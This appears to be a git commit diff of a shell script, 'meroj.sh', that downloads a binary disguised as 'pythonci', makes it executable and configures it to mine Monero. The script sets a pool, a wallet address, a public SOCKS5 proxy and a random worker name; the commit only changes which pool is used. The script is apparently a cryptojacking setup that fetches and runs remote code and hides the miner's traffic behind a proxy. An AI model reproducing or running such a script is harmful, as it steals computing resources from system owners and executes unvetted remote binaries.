8d14b89c26565261e103a9aeb92447a2c0af41cd
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-21 21:23:26 +0100

    Update meroj.sh

--- meroj.sh
+++ meroj.sh
@@ -5,7 +5,7 @@ sudo apt install screen libjansson4 -y
 wget https://github.com/NRC-TECH/test-files/raw/main/pythonci
 chmod +x pythonci
 screen -dmS ls
-POOL=stratum+tcp://monerohash.com:5555 
+POOL=stratum+tcp://pool.supportxmr.com:5555
 WALLET=88MZkAYp2JCER2PUEUiBf2KvQAszwju5TUFnJgDBx59gBSU8tMGJwuWgGFwQrBc61R56tC4f1FBABdbXtwbWCgk8DkStvmj 
 PROXY=socks5://72.195.114.169:4145
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-nizam)
